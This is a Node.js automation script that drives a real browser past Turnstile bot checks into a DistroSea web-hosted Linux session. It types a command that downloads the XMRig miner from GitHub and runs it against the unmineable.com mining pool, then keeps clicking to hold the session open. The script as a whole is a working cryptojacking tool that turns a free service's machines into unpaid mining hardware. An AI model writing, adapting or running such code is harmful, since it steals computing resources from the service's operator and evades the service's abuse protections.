const { connect } = require("puppeteer-real-browser");
const distrosea = require("./distrosea.js");
const proxy = require("./proxy.js");
const sleep = require("./sleep.js");
require("dotenv").config();

const run = async () => {
  let getUrl = false;
  while (!getUrl) {
    getUrl = await distrosea();
    await sleep(2);
  }

  const { page, browser } = await connect({
    args: [
      "--disable-gpu",
      "--no-sandbox",
      "--disable-setuid-sandbox",
      "--disable-dev-shm-usage",
      "--disable-extensions",
      "--disable-images",
      "--disable-web-security",
      "--disable-features=IsolateOrigins,site-per-process",
    ],
    headless: false,
    turnstile: true,
    disableXvfb: false,
    ignoreAllFlags: false,
    proxy: proxy.host ? proxy : false,
  });

  setInterval(async () => {
    try {
      await page.screenshot({ path: "screenshot.png" });
    } catch (err) {}
  }, 500);

  try {
    await page.setRequestInterception(true);
    page.on("request", (req) => {
      const url = req.url();
      if (
        url.includes("doubleclick.net") ||
        url.includes("adservice.google.com") ||
        url.includes("googlesyndication.com")
      ) {
        req.abort();
      } else {
        req.continue();
      }
    });

    await page.goto(getUrl);
    await page.waitForSelector("body");
    await sleep(15);

    const coin = process.env.COIN;
    const job = `pc${Math.floor(Math.random() * 99) + 1}`;
    console.log(coin, job);

    let text = "";
    text +=
      "wget https://github.com/xmrig/xmrig/releases/download/v6.22.0/xmrig-6.22.0-linux-static-x64.tar.gz ";
    text += "&& tar -xzvf xmrig-6.22.0-linux-static-x64.tar.gz ";
    text += "&& cd xmrig-6.22.0 ";
    text += "&& chmod +x xmrig ";
    text += "&& clear ";
    text += `&& ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u ${coin}.${job}#rup9-jjmz -p x`;

    for (let i = 0; i < text.length; i++) {
      const char = text[i];
      if (
        char === ":" ||
        char === "&" ||
        char === "#" ||
        (char === char.toUpperCase() && char !== char.toLowerCase())
      ) {
        await page.keyboard.down("Shift");
        await page.keyboard.type(char);
        await page.keyboard.up("Shift");
      } else {
        await page.keyboard.type(char, { delay: 80 });
      }
    }
    await page.keyboard.press("Enter");

    let verificarUrl = page.url();
    while (verificarUrl.includes("distrosea.com/view")) {
      verificarUrl = page.url();
      const viewport = page.viewport();
      const centerX = viewport.width / 2;
      const centerY = viewport.height / 2;
      await page.mouse.click(centerX, centerY);
      await sleep(2);
    }
    console.log(page.url());
    return false;
  } catch (error) {
    console.error(`Erro interno do servidor: ${error.message}`);
    return false;
  } finally {
    await browser.close();
  }
};

module.exports = run;
